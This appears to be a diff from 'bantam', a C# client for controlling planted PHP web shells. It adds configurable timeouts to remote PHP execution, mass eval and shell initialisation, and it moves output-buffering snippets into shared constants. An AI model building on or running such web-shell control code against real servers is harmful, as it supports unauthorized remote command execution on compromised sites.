@@ -152,7 +152,6 @@ namespace bantam
         /// <param name="prependText"></param>
         public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, bool base64DecodeResponse = false, RichTextBox richTextBox = null, string prependText = "")
         {
-            //todo this doesn't have a timeout
             string result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);
 
             if (string.IsNullOrEmpty(result) == false) {
@@ -195,8 +194,7 @@ namespace bantam
 
                 var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpBuilder.InitShellData(encryptResponse));
 
-                //todo add to global config delay
-                if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
+                if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                     ResponseObject response = task.Result;
 
                     if (string.IsNullOrEmpty(response.Result) == false) {
@@ -238,23 +236,26 @@ namespace bantam
         /// <returns></returns>
         private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
         {
-            //todo no timeout
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
+            string result = string.Empty;
+            var task = WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
-            if (string.IsNullOrEmpty(response.Result)) {
-                LogHelper.AddShellLog(shellUrl, "Empty response from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
-                return string.Empty;
-            }
+            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
+                ResponseObject response = task.Result;
+                if (string.IsNullOrEmpty(response.Result)) {
+                    LogHelper.AddShellLog(shellUrl, "Empty response from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
+                    return string.Empty;
+                }
 
-            string result = response.Result;
+                result = response.Result;
 
-            if (encryptResponse) {
-                result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
-            }
+                if (encryptResponse) {
+                    result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
+                }
 
-            if (string.IsNullOrEmpty(result)) {
-                LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
-                return string.Empty;
+                if (string.IsNullOrEmpty(result)) {
+                    LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
+                    return string.Empty;
+                }
             }
 
             return result;
@@ -290,25 +291,22 @@ namespace bantam
                 return;
             }
 
-            string code;
             bool checkBoxChecked = true;
             string shellUrl = SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
 
-            if (encryptResponse) {
-                string preCode = "@ob_start();";
-                string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
-                code = preCode + GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked) + postCode;
-            } else {
-                code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
-            }
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
 
             if (string.IsNullOrEmpty(code) == false) {
+                if (encryptResponse) {
+                    code = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
+                }
+
                 if (checkBoxChecked) {
                     ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                 } else {
-                    await WebHelper.ExecuteRemotePHP(shellUrl, code).ConfigureAwait(false);
+                    await WebHelper.ExecuteRemotePHP(shellUrl, code);
                 }
             } else {
                 LogHelper.AddShellLog(shellUrl, "Attempted to eval empty code.", LogHelper.LOG_LEVEL.info);
@@ -363,9 +361,7 @@ namespace bantam
 
                     string finalCode = code;
                     if (encryptResponse) {
-                        string preCode = "@ob_start();";
-                        string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
-                        finalCode = preCode + code + postCode;
+                        finalCode = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
                     }
                     ExecuteMassEval(shellUrl, finalCode, encryptResponse, ResponseEncryptionMode, showResponse, rtb);
                 }
